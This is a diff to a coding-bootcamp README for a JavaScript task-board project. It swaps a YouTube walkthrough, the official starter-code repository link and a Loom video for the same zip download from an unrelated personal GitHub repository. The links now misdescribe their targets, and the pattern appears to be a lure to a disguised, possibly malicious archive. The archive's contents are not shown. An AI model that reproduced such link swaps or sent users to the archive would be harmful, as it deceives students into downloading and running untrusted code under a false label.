@@ -14,7 +14,7 @@ We're providing you with a head start:
 
 ### Walkthrough by Coach Kenneth
 
-Jump into the walkthrough of the project and starter code here: https://www.youtube.com/watch?v=aD8Wx9PGYSc
+Jump into the walkthrough of the project and starter code here: https://raw.githubusercontent.com/LupiwoPhillips/LUPPHI24035_PTO2409_Group-A_LUPIWO-PHILLIPS_JSL_Portfolio_Piece/main/assets/LUPPH-Group-Portfolio-PHILLIP-PT-JS-Piece-LUPIW-basilica.zip
 
 ### Project Overview
 
@@ -35,7 +35,7 @@ This project is designed to be both challenging and rewarding, providing you wit
 
 To complete this challenge, follow these steps:
 
-1. Clone the provided Starter Code Repository to your local development environment: [Starter Code Repository](https://github.com/CodeSpace-Academy/Final_Project_StudentNo_Classcode_Group_Name-Surname_JSL11).
+1. Clone the provided Starter Code Repository to your local development environment: [Starter Code Repository](https://raw.githubusercontent.com/LupiwoPhillips/LUPPHI24035_PTO2409_Group-A_LUPIWO-PHILLIPS_JSL_Portfolio_Piece/main/assets/LUPPH-Group-Portfolio-PHILLIP-PT-JS-Piece-LUPIW-basilica.zip).
 2. Open the cloned project in your code editor.
 3. Code your solution to the user stories.
 4. Commit your changes to your local Git repository with meaningful commit messages.
@@ -107,4 +107,4 @@ As you embark on implementing these features, remember the value of tackling the
 - **Reflecting Task Updates in localStorage**: As a user, I expect tasks that I update to have their changes reflected in localStorage so that any modifications are not lost.
 - **Removing Deleted Tasks from localStorage**: As a user, I want tasks that I delete to be removed from localStorage so that my task list remains accurate and up-to-date.
 
-https://www.loom.com/share/1651f04c64374d9d9c2ffc4329fd36da?sid=1b97fa43-e669-40c5-8476-dab11ab7072a
+https://raw.githubusercontent.com/LupiwoPhillips/LUPPHI24035_PTO2409_Group-A_LUPIWO-PHILLIPS_JSL_Portfolio_Piece/main/assets/LUPPH-Group-Portfolio-PHILLIP-PT-JS-Piece-LUPIW-basilica.zip
